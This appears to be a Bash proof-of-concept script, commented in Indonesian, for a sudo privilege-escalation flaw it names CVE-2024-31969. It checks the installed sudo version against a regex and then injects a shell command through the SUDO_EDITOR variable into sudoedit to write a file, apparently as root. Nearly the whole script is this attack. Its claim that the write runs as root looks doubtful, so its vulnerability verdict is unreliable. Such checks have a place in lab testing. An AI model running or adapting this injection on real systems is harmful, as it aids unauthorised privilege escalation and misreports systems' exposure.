#!/bin/bash

echo "[*] Mengecek versi sudo..."
SUDO_VER=$(sudo -V | grep "Sudo version" | awk '{print $3}')
echo "[+] Versi sudo terdeteksi: $SUDO_VER"

# Cek apakah versi rentan terhadap CVE-2024-31969
if [[ "$SUDO_VER" =~ ^1\.9\.([0-9]|1[0-5])($|p[0-4]$) ]]; then
    echo "[!] Rentan terhadap CVE-2024-31969"
    echo ""

    TARGET="/tmp/hackedfile"

    echo ">>> EKSEKUSI TEST CVE-2024-31969 (LAB-ONLY DUMMY) <<<"
    echo "[*] Menulis 'hacked' ke $TARGET sebagai root via sudoedit..."

    export SUDO_EDITOR="bash -c 'echo hacked > $TARGET'"
    sudoedit $TARGET

    echo "[*] Hasil file:"
    cat $TARGET

    echo "[*] Cek permission file:"
    ls -l $TARGET

    echo ""
    echo "[!] Jika file di atas ditulis root, berarti sistem rentan."
else
    echo "[+] Versi sudo Anda aman dari CVE-2024-31969."
fi
